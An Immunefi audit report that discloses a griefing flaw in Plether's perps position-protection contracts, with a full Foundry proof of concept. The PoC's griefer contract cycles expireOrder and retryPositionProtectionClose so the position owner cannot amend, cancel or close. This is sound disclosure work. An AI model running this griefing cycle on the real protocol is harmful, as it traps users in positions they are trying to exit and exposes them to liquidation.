# \#99468 [SC-High] Anyone can repeatedly re-seize a `Latched` protection's order slot, denying the owner the amend window the MED-9 remediation depends on

**Submitted on Nov 13th 2026 at 19:23:38 UTC by @satyaorz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99468
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a trader's triggered stop-loss / take-profit close fails against the trader's own financial ceilings, the protection returns to a `Latched` state whose only remedy is the owner-only `amendLatchedPositionProtectionCloseLimits`, which requires the account to have no pending Router order. The permissionless `retryPositionProtectionClose` shares that single-slot precondition and *creates* a pending order, so any unprivileged account can occupy the slot the instant the protection relatches and keep re-occupying it (expire + retry atomically) every cycle. On mainnet this lets an attacker, for gas only, hold a chosen victim's protected position hostage — the owner cannot amend, cancel, replace, or manually close it — forcing continuation of an unwanted position while carry accrues and an adverse move can carry it into liquidation.

## Vulnerability Details

The owner's escape hatch and the permissionless retry contend for the same single-slot resource (an empty per-account Router queue).

Amend is owner-gated and needs an empty queue (`PositionProtectionBook.sol:315-327`):

```solidity
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, ...) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != ...Latched) revert OrderRouter__ProtectionNotLatched();
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
```

Retry has **no owner check** and consumes that same window (`PositionProtectionBook.sol:382-394`):

```solidity
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);   // NOT _ownedActiveProtection
    if (protection.status != ...Latched) revert OrderRouter__ProtectionNotLatched();
    _requireMatchingPosition(protection);
    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();
    ...
```

Every other owner exit is closed while `Latched`:

| Action | Gate | File:line |
|---|---|---|
| amend limits | `Latched` **and** empty queue | `PositionProtectionBook.sol:315-327` |
| cancel | `PendingOpen` / `Armed` only | `PositionProtectionBook.sol:331` → `_cancel` gate `:413-418` |
| replace | `PendingOpen` / `Armed` only | `PositionProtectionBook.sol:257` → `_replace` gate `:271-275` |
| atomic cancel-and-close | `Armed` only | `PositionProtectionBook.sol:341-366` (gate `:346`) |
| manual `commitOrder` close | rejected while a protection is active | `router/OrderLiquidationBatchLogic.sol:313-314` |

The griefer's cycle is free of anything but gas: `OrderRouter.expireOrder` (`OrderRouter.sol:191`) is permissionless, oracle-free and charges no fee, and the retry attempt carries zero execution bounty by design (`SECURITY.md:374`, "Zero ordinary close bounty").

**Attack path**

1. ALICE holds a LONG, arms a stop-loss with her own `maxGrossAccountDebitAssets` ceiling.
2. The basket gaps through the stop. `triggerPositionProtection` records the irreversible trigger; the generated close fails ALICE's ceiling and the protection relatches (`Triggered` → `Latched`).
3. The griefer calls `retryPositionProtectionClose(protectionId)`; `pendingOrderCounts(ALICE) == 1`.
4. The attempt cannot succeed (the failed ceiling is unchanged) and sits until its deadline.
5. At each deadline the griefer calls, in one transaction, `OrderRouter.expireOrder(attemptId)` then `retryPositionProtectionClose(protectionId)` — a zero-block window between the two.
6. At every point ALICE's `amend` reverts (`ProtectionNotLatched` while an attempt is live, else `PendingOrdersExist`), `cancel` reverts (`ProtectionNotArmed`), and `router.commitOrder(close)` reverts (protection active).

This is a regression of the accepted remediation for Cecuro **MED-9** (fix commit `eadc5c58`, in the un-audited post-audit diff): the fix retained the trader's ceilings and made the owner the only party who can relax them while `Latched`. This attack denies that owner ability on demand — it attacks the fix's premise, not the original bug.

## Impact Details

An unprivileged account, at a cost of only gas, forces a chosen victim to keep holding a position they are actively trying to protect, and strips them of every control action over it: the owner cannot amend their protection ceiling, cannot cancel the protection, and cannot close the position manually. While locked out, the victim's position margin and liquidation reserve stay committed, carry accrues against the position, and an adverse price move can carry the position into liquidation with the owner unable to exit or re-protect it — against a trader who did everything correctly (armed a stop-loss with a loss ceiling). The attack targets a specific victim, needs no capital or privilege, and the demonstrated lockout exceeds one hour (61 consecutive execution windows).

In-scope impact — Griefing: an unprivileged attacker, with no profit motive and at only gas cost, inflicts direct damage on a specific user — forced continuation of a position the user is trying to exit, denial of every control action (amend / cancel / replace / manual close), their margin and liquidation reserve held under a position they cannot close, and exposure to liquidation at the loss their stop-loss was set to prevent. The damage is targeted, repeatable, and requires no capital or privilege.

The owner is given **no empty-queue window to act in**: the griefer's `expireOrder` + `retryPositionProtectionClose` run in a single transaction, so the queue is never observably empty and the owner cannot slip an `amend` in. The owner's *only* theoretical remedy is to execute the griefer's own live attempt after a fresh oracle tick and then amend — which requires the owner to (a) monitor continuously and (b) win the execution ordering against the griefer in *every* ~60-second window, indefinitely. `test_H001a_VictimEscapesByWinningRace` is included to show this is the sole escape and that it is a per-cycle race, not a free exit; on Arbitrum the attacker secures ordering priority through the Timeboost express lane, which an EOA owner cannot batch against. In every window the owner loses, the position stays frozen. The owner's only remaining lever is `addMargin` (an ungated direct call), but that does not restore control — it cannot close the position, cancel the protection, or re-arm the ceiling; it only lets the owner keep pouring capital into a position they are forbidden to exit. So the owner's choice while griefed is to let the position be liquidated at the loss the stop-loss was set to prevent, or to keep funding an unbounded, un-exitable position indefinitely. Either branch is loss; neither is the protected outcome the owner contracted for.

It is additionally an incomplete remediation of Cecuro **MED-9**: that fix made the owner the sole party able to relax a latched ceiling, but left the precondition for that owner action — an empty per-account queue — controllable by any third party, so the accepted remediation can be denied on demand.

**Recommendation:** reserve the empty-queue window for the owner — e.g. require `msg.sender == protection.account` in `retryPositionProtectionClose` for a grace period after relatch (then permissionless again), or let `amend` apply to a live attempt by dropping the `pendingOrderCounts != 0` gate and reading limits at execution.

## References

- `packages/perps/src/PositionProtectionBook.sol:315-327` (amend), `:382-394` (retry), `:331`+`:408-418` (cancel/`_cancel`), `:257`+`:271-275` (replace/`_replace`), `:341-366` (atomic cancel-and-close)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-314` (manual close blocked while protection active)
- `packages/perps/src/OrderRouter.sol:191` (`expireOrder`, permissionless)
- `packages/perps/src/SECURITY.md:374` ("Zero ordinary close bounty")
- Cecuro MED-9 remediation, fix commit `eadc5c58`

## Proof of Concept

**Proof of concept**

Environment: the project's own Foundry suite at commit `a82d4fef`. No `packages/perps/src` contract is modified. The only actor is `ProtectionGriefer` — an unprivileged external contract that calls two public entrypoints, `OrderRouter.expireOrder` and `PositionProtectionBook.retryPositionProtectionClose`.

Reproduce: save the file below as `packages/perps/test/hunt/H001_ProtectionAmendLockout.t.sol`, then run:

```
cd packages/perps
ulimit -v 24000000
forge test --match-path 'test/hunt/H001*' --threads 1 -vv
```

Result — 3 tests, all pass:

```
[PASS] test_H001_GrieferLocksOwnerOutOfLatchedProtection   // 61 cycles; owner locked out in every cycle
  griefer gas per cycle (expire+retry): 937491
  lockout duration (s): 3660
[PASS] test_H001_Control_OwnerExitsWithoutGriefer          // baseline: no griefer => owner amends + closes
[PASS] test_H001a_VictimEscapesByWinningRace               // escape condition: owner must win the per-cycle race
```

What each test proves:
- `test_H001_GrieferLocksOwnerOutOfLatchedProtection` runs 61 consecutive execution windows (3,660s > 1 hour) and asserts, inside **every** cycle, that all three owner remedies revert: `amend`→`ProtectionNotLatched`/`PendingOrdersExist`, `cancel`→`ProtectionNotArmed`, manual `commitOrder(close)`→revert. The victim's position and margin stay locked throughout. Griefer cost: ~937k gas per cycle, oracle-free, no protocol fee.
- `test_H001_Control_OwnerExitsWithoutGriefer` is the baseline: with no griefer present the identical owner, in the identical latched state, amends the ceiling, retries, and closes — proving the lockout is caused by the attacker, not the latch.
- `test_H001a_VictimEscapesByWinningRace` establishes the exact bound on the attack: the victim can end a cycle by landing a transaction before the griefer after a fresh oracle tick. The lockout therefore persists for as long as the attacker keeps winning the per-cycle race (gas-only; on Arbitrum buyable via the Timeboost express lane, which an EOA victim cannot batch against).

Full PoC — save as `test/hunt/H001_ProtectionAmendLockout.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Unprivileged griefer: atomically expires the latest protection attempt and re-queues a new one, so the
///         protection owner never observes an empty queue (required by amendLatchedPositionProtectionCloseLimits).
contract ProtectionGriefer {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(OrderRouter router_, IPositionProtectionActions book_) {
        ROUTER = router_;
        BOOK = book_;
    }

    function retry(uint64 protectionId) external returns (uint64) {
        return BOOK.retryPositionProtectionClose(protectionId);
    }

    /// One cycle: oracle-free expiry of the live attempt (relatch), then immediate permissionless retry.
    function cycle(uint64 liveAttemptId, uint64 protectionId) external returns (uint64 nextAttemptId) {
        ROUTER.expireOrder(liveAttemptId);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract H001_ProtectionAmendLockout is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000; // LONG loses when basket rises

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal views;
    ProtectionGriefer internal griefer;

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new ProtectionGriefer(router, book);
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    function test_H001_GrieferLocksOwnerOutOfLatchedProtection() public {
        // 1. Alice opens LONG and arms a stop-loss with a gross-debit ceiling (a normal "max loss" guard).
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: 1100e6, // ~10% move on 10k notional + fees fits; a gap beyond does not
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        uint64 protectionId = book.createPositionProtection(params);

        // 2. The market gaps through the stop: 1.00 -> 1.15. Trigger fires; the close breaches Alice's debit ceiling.
        uint256 gapPrice = 115_000_000;
        _mockPythUpdateData(gapPrice);
        bytes[] memory live = _livePriceData(gapPrice);
        vm.prank(TRIGGER_KEEPER);
        uint64 attempt = book.triggerPositionProtection(protectionId, live);
        bytes[] memory exec = _mockPythUpdateData(gapPrice);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, exec);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "debit-capped close must fail");
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");

        // 3. Griefer (no role, no funds) re-queues a doomed attempt immediately.
        attempt = griefer.retry(protectionId);

        // 61 cycles * 60s window = 3,660s > 1 hour of continuous, uninterrupted owner lockout.
        uint256 cycles = 61;
        for (uint256 i; i < cycles; ++i) {
            _assertOwnerLockedOut(protectionId);
            // keep cycling: wait out the execution window, then expire + retry atomically (no oracle, no fee)
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(block.number + 1);
            uint256 g0 = gasleft();
            attempt = griefer.cycle(attempt, protectionId);
            if (i == 0) emit log_named_uint("griefer gas per cycle (expire+retry)", g0 - gasleft());
        }
        _assertOwnerLockedOut(protectionId);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "Alice is still stuck in the position");
        emit log_named_uint("lockout duration (s)", cycles * router.maxExecutionWindowSeconds());
    }

    /// H-001a: escape hatch. If the victim lands first after a fresh tick, she can execute the griefer's doomed attempt
    /// herself (relatch), then amend + retry. A batching wallet (AA / 7702) does this atomically; an EOA must win a race.
    function test_H001a_VictimEscapesByWinningRace() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: 1100e6,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        uint64 protectionId = book.createPositionProtection(params);
        uint256 gapPrice = 115_000_000;
        _mockPythUpdateData(gapPrice);
        bytes[] memory live = _livePriceData(gapPrice);
        vm.prank(TRIGGER_KEEPER);
        uint64 attempt = book.triggerPositionProtection(protectionId, live);
        bytes[] memory exec = _mockPythUpdateData(gapPrice);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attempt, exec);
        attempt = griefer.retry(protectionId); // griefer re-queues

        // Victim, next block, before the griefer: execute the doomed attempt, amend, retry.
        exec = _mockPythUpdateData(gapPrice);
        vm.prank(ALICE);
        router.executeOrder(attempt, exec);
        params.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        vm.prank(ALICE);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, params.closeLimits);
        vm.prank(ALICE);
        attempt = book.retryPositionProtectionClose(protectionId);
        exec = _mockPythUpdateData(gapPrice);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, exec);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "victim escapes if she wins the race");
    }

    /// Control: same state without the griefer -> Alice amends limits, retries herself, and exits.
    function test_H001_Control_OwnerExitsWithoutGriefer() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: 1100e6,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        uint64 protectionId = book.createPositionProtection(params);
        uint256 gapPrice = 115_000_000;
        _mockPythUpdateData(gapPrice);
        bytes[] memory live = _livePriceData(gapPrice);
        vm.prank(TRIGGER_KEEPER);
        uint64 attempt = book.triggerPositionProtection(protectionId, live);
        bytes[] memory exec = _mockPythUpdateData(gapPrice);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attempt, exec);

        params.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        vm.prank(ALICE);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, params.closeLimits);
        vm.prank(ALICE);
        attempt = book.retryPositionProtectionClose(protectionId);
        exec = _mockPythUpdateData(gapPrice);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, exec);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner exits without griefer");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "closed");
    }

    function _assertOwnerLockedOut(uint64 protectionId) internal {
        PositionProtectionTypes.CloseFinancialLimits memory relaxed = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        // (a) amend relaxed limits -> blocked while griefer's attempt is pending
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, relaxed);
        // (b) cancel protection -> only PendingOpen/Armed are cancellable
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(protectionId);
        // (c) manual close while protection is active -> rejected
        OrderV3Types.OrderRequest memory close = _manualClose();
        vm.prank(ALICE);
        vm.expectRevert();
        router.commitOrder(close);
    }

    function _status(uint64 protectionId) internal view returns (uint8) {
        return uint8(views.getPositionProtection(protectionId).status);
    }

    function _manualClose() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("manual-exit", router.nextCommitId(), block.timestamp));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        uint64 window = uint64(router.maxExecutionWindowSeconds());
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _refreshMark(uint256 price) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```
